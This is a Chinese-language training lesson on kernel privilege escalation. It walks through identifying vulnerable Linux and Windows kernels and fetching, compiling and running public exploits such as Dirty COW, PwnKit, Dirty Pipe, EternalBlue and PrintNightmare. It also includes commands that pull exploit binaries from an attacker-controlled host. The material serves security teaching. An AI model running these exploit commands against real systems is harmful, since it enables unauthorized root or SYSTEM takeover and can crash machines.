---
title: Day057：内核漏洞利用入门
tags:
  - 网络安全
  - 内核漏洞
  - 提权
categories:
  - 90天安全突击
stage: 攻坚
abbrlink: d057
date: 2026-03-20
updated: 2026-01-28
---

# Day057：内核漏洞利用入门

## 基本信息

| 项目 | 内容 |
|------|------|
| **所属阶段** | 攻坚（第二阶段） |
| **所属周次** | Week 9：系统提权入门 |
| **今日主题** | Linux/Windows 内核漏洞利用基础 |
| **预计时间** | 3 小时 |
| **难度等级** | 进阶+ |

---

## 今日痛点场景

> **场景**：你试遍了 SUID、sudo、Cron、服务……都没找到可利用的点。但你发现目标系统内核版本很老——Linux 3.13，上次更新是 3 年前。
>
> **问题**：能不能直接利用内核漏洞提权？
>
> **今天的任务**：学习内核漏洞利用基础——这是提权的"核武器"，成功率高但风险也高。

---

## 今日目标

- [ ] 理解内核漏洞利用的原理
- [ ] 掌握 Linux 内核漏洞识别与利用
- [ ] 了解 Windows 内核漏洞利用
- [ ] 完成内核提权实战

**闯关条件**：成功利用内核漏洞获取 root/SYSTEM 权限。

---

## 实战任务（先动手！）

### 任务 1：内核漏洞基础（25 分钟）

**什么是内核漏洞？**
```
内核 = 操作系统核心
     - 管理硬件资源
     - 执行系统调用
     - 权限最高

内核漏洞 = 内核代码中的缺陷
     - 可能导致权限提升
     - 可能导致系统崩溃
     - 可能导致代码执行

利用内核漏洞 = 直接获取最高权限
```

**内核漏洞类型**：
```
1. 缓冲区溢出
   - 栈溢出、堆溢出
   - 覆盖返回地址或函数指针

2. 空指针解引用
   - 将用户数据映射到空地址
   - 控制执行流

3. Use-After-Free
   - 释放后使用
   - 控制被释放的内存

4. 整数溢出
   - 绕过长度检查
   - 导致缓冲区溢出

5. 条件竞争
   - TOCTOU（检查到使用）
   - 利用时间窗口
```

**内核利用的特点**：
```
优点：
- 成功率高（绕过所有用户态防护）
- 直接获取最高权限
- 通常不需要特殊配置

缺点：
- 可能导致系统崩溃
- 需要匹配精确版本
- 检测和日志可能更多
- 利用代码可能不稳定
```

**记录**：
```
理解的漏洞类型：________________
```

---

### 任务 2：Linux 内核漏洞识别（35 分钟）

**识别内核版本**：
```bash
# 内核版本
uname -r
# 输出示例：3.13.0-24-generic

# 完整系统信息
uname -a
# Linux victim 3.13.0-24-generic #46-Ubuntu SMP x86_64 GNU/Linux

# 发行版信息
cat /etc/*release

# 所有信息
cat /proc/version
```

**使用漏洞建议工具**：

**linux-exploit-suggester**：
```bash
# 下载
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh

# 运行
./linux-exploit-suggester.sh

# 输出示例
[+] [CVE-2016-5195] dirtycow

   Details: https://dirtycow.ninja/
   Exposure: highly probable
   Tags: debian=7|8,ubuntu=16.04,ubuntu=14.04
   Download URL: https://www.exploit-db.com/exploits/40839
```

**linux-exploit-suggester-2（Perl 版）**：
```bash
# 下载
wget https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl
chmod +x linux-exploit-suggester-2.pl

# 运行
./linux-exploit-suggester-2.pl
```

**searchsploit 查询**：
```bash
# 搜索特定内核版本
searchsploit linux kernel 3.13

# 搜索特定发行版
searchsploit ubuntu 14.04 privilege escalation

# 复制利用代码
searchsploit -m 40839
```

**记录**：
```
目标内核版本：________________
建议的漏洞：________________
```

---

### 任务 3：著名 Linux 内核漏洞（50 分钟）

**Dirty COW (CVE-2016-5195)**：
```bash
# 影响范围
# Linux kernel 2.6.22 - 4.8.3

# 原理
# 写时复制（COW）的条件竞争漏洞
# 可以写入只读文件

# 下载利用代码
wget https://www.exploit-db.com/download/40839 -O dirtycow.c

# 编译
gcc -pthread dirtycow.c -o dirtycow -lcrypt

# 利用方式 1：修改 /etc/passwd
./dirtycow /etc/passwd root_password

# 利用方式 2：覆盖 SUID 程序
# cowroot 版本
wget https://gist.githubusercontent.com/rverton/e9d4ff65d703a9084e85fa9df083c679/raw/cowroot.c
gcc cowroot.c -o cowroot -pthread
./cowroot
```

**Dirty Pipe (CVE-2022-0847)**：
```bash
# 影响范围
# Linux kernel 5.8 - 5.16.10

# 原理
# 管道缓冲区的标志处理问题
# 可以覆盖只读文件

# 下载
wget https://haxx.in/files/dirtypipez.c

# 编译
gcc dirtypipez.c -o dirtypipez

# 利用
./dirtypipez /usr/bin/su
```

**PwnKit (CVE-2021-4034)**：
```bash
# 影响范围
# Polkit pkexec - 所有 Linux（2009-2022）

# 原理
# pkexec 处理参数时的内存损坏

# 利用非常简单
git clone https://github.com/ly4k/PwnKit
cd PwnKit
./PwnKit
# 直接获得 root！
```

**OverlayFS (CVE-2021-3493)**：
```bash
# 影响范围
# Ubuntu 20.10, 20.04, 18.04, 16.04

# 原理
# OverlayFS 的权限检查不当

# 利用
git clone https://github.com/briskets/CVE-2021-3493
cd CVE-2021-3493
make
./exploit
```

**完整利用流程**：
```bash
# 1. 识别内核版本
uname -r

# 2. 运行漏洞建议
./linux-exploit-suggester.sh

# 3. 选择合适的漏洞
# 优先选择：
# - Exposure: highly probable
# - 有现成 PoC
# - 不会导致崩溃

# 4. 下载/编译利用代码
wget <exploit_url>
gcc exploit.c -o exploit

# 5. 执行
./exploit
whoami  # root!
```

**记录**：
```
尝试的漏洞：________________
成功的漏洞：________________
```

---

### 任务 4：Windows 内核漏洞利用（40 分钟）

**识别 Windows 版本**：
```cmd
:: 系统信息
systeminfo

:: 关键字段
:: OS Name: Microsoft Windows 10 Pro
:: OS Version: 10.0.17763
:: Hotfix(s): 4 Hotfix(s) Installed
```

**Windows Exploit Suggester**：
```bash
# 在攻击机上运行

# 更新数据库
python windows-exploit-suggester.py --update

# 导出 systeminfo（在目标上）
systeminfo > systeminfo.txt

# 分析
python windows-exploit-suggester.py --database 2024-01-01-mssb.xls --systeminfo systeminfo.txt
```

**著名 Windows 内核漏洞**：

**MS15-051**：
```
影响：Windows 2003-2008 R2
提权到 SYSTEM

利用：
msfvenom -p windows/shell_reverse_tcp ... -f exe > shell.exe
ms15-051.exe "C:\Windows\Temp\shell.exe"
```

**MS16-032**：
```
影响：Windows 7-10, Server 2008-2012 R2
Secondary Logon 服务漏洞

利用（PowerShell）：
Import-Module .\Invoke-MS16-032.ps1
Invoke-MS16-032
```

**MS16-098**：
```
影响：Windows 8.1, 10
内核池溢出

利用：
bfill.exe "whoami"
```

**EternalBlue (MS17-010)**：
```
影响：Windows XP-8.1, Server 2003-2012 R2
SMB 漏洞，可远程利用

利用：
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target_ip
run
```

**Print Nightmare (CVE-2021-1675/34527)**：
```
影响：所有 Windows 版本
打印机服务漏洞

利用：
# PowerShell
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -DriverName "Xerox" -NewUser "hacker" -NewPassword "P@ssw0rd"
```

**使用 Metasploit 自动利用**：
```bash
# local_exploit_suggester
use post/multi/recon/local_exploit_suggester
set SESSION 1
run

# 输出建议的漏洞模块
# 选择使用
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
set SESSION 1
run
```

**记录**：
```
Windows 版本：________________
可用的内核漏洞：________________
```

---

### 任务 5：内核利用注意事项（20 分钟）

**利用前检查**：
```bash
# 1. 确认版本匹配
uname -r  # Linux
systeminfo  # Windows

# 2. 检查安全措施
# Linux
cat /proc/sys/kernel/randomize_va_space  # ASLR
dmesg | grep -i nx  # NX/DEP

# Windows
# 查看 EMET/Exploit Guard 状态

# 3. 备份重要数据
# 内核利用可能导致崩溃
```

**编译问题处理**：
```bash
# 缺少库
apt-get install build-essential
yum groupinstall "Development Tools"

# 缺少头文件
apt-get install linux-headers-$(uname -r)

# 32/64 位不匹配
gcc -m32 exploit.c -o exploit  # 32位
gcc -m64 exploit.c -o exploit  # 64位

# 静态编译（目标无编译器）
gcc -static exploit.c -o exploit
```

**传输利用代码**：
```bash
# 如果目标无法下载
# 在攻击机上
python3 -m http.server 8080

# 在目标上
wget http://attacker:8080/exploit
curl http://attacker:8080/exploit -o exploit

# 或 Base64 编码传输
base64 exploit > exploit.b64
# 复制内容到目标
base64 -d exploit.b64 > exploit
```

**失败后处理**：
```
如果利用失败：
1. 检查版本是否精确匹配
2. 检查是否有补丁
3. 尝试其他 PoC
4. 查看系统日志定位问题

如果系统崩溃：
- 等待管理员重启
- 或放弃此机器
- 提前做好备份和退路
```

**记录**：
```
遇到的问题：________________
解决方法：________________
```

---

## 今日闯关检查

| 检查项 | 分数 |
|--------|------|
| 理解内核漏洞原理 | 15 分 |
| 识别目标内核版本 | 15 分 |
| 使用漏洞建议工具 | 20 分 |
| 成功编译利用代码 | 20 分 |
| 成功内核提权 | 30 分 |

**60 分及格，80 分优秀，100 分满分**

你的得分：____

---

## 底层补课

### 内核利用原理

```
用户态 → 内核态
     ↓
用户进程触发内核漏洞
     ↓
在内核态执行攻击者代码
     ↓
修改当前进程的权限结构
     ↓
返回用户态，进程已是 root
```

### Linux 权限结构

```c
// 每个进程有 task_struct
struct task_struct {
    // ...
    const struct cred *cred;  // 权限凭据
    // ...
};

struct cred {
    uid_t uid;    // 真实 UID
    uid_t euid;   // 有效 UID
    gid_t gid;    // 真实 GID
    gid_t egid;   // 有效 GID
    // ...
};

// 提权 = 修改 cred 结构
// uid/euid/gid/egid 都改成 0
```

### Windows 权限结构

```
每个进程有 Token
Token 包含：
- User SID
- Group SIDs
- Privileges

提权 =
1. 窃取 SYSTEM 的 Token
2. 修改当前 Token
3. 创建新的高权限 Token
```

---

## 避坑指南

| 坑点 | 症状 | 解决方案 |
|------|------|----------|
| 版本不匹配 | 利用失败或崩溃 | 确认精确版本号 |
| 已打补丁 | 利用失败 | 尝试其他漏洞 |
| 编译失败 | 缺少库/头文件 | 安装开发工具 |
| 系统崩溃 | 机器无响应 | 内核利用风险，做好准备 |

---

## 知识卡片速查

### Linux 漏洞建议

```bash
# linux-exploit-suggester
./linux-exploit-suggester.sh

# 快速内核版本
uname -r

# searchsploit
searchsploit linux kernel 3.13
```

### 著名 Linux 漏洞

```
Dirty COW (CVE-2016-5195): 2.6.22 - 4.8.3
Dirty Pipe (CVE-2022-0847): 5.8 - 5.16.10
PwnKit (CVE-2021-4034): 所有 Linux
OverlayFS (CVE-2021-3493): Ubuntu 16-20
```

### 著名 Windows 漏洞

```
MS15-051: 2003-2008 R2
MS16-032: 7-10, Server 2008-2012 R2
MS17-010 EternalBlue: XP-8.1
Print Nightmare (CVE-2021-1675): 所有版本
```

---

## 常见问题

**Q1：内核利用会导致系统崩溃吗？**

A1：
- 可能会，尤其是不稳定的 PoC
- 建议先在测试环境验证
- 实战中做好心理准备

**Q2：如何判断是否已打补丁？**

A2：
- Linux：检查内核小版本号
- Windows：检查 Hotfix 列表
- 使用漏洞建议工具会考虑补丁

**Q3：没有编译器怎么办？**

A3：
- 在攻击机上静态编译后传输
- 使用预编译的二进制文件
- 传输源码用解释型语言版本

---

## 明日预告

**Day 058：Week 9 周末闯关 - 系统提权综合**

明天你将：
- 完成本周综合挑战
- 回顾 Linux/Windows 提权技术
- 输出 Week 9 学习总结

---

## 学习记录

| 项目 | 内容 |
|------|------|
| 实际学习日期 | |
| 成功利用的内核漏洞 | |
| 使用的工具 | |
| 今日收获 | |

---

> **导师点评**：
>
> 内核漏洞是提权的"核武器"——威力大，但风险也大。
>
> 在实战中，内核利用通常是最后的选择。它可能导致系统崩溃，触发告警，留下日志。但有时候，它是唯一的选择。
>
> 好消息是，很多系统确实很久没打补丁。Dirty COW 2016 年的漏洞，PwnKit 2021 年的漏洞，到现在仍然能在很多系统上用。
>
> **记住：内核利用不是第一选择，而是最后手段。先穷尽其他方法，实在不行再上内核**。

```bash
echo "Day 057 Complete! 内核漏洞利用入门！"
```
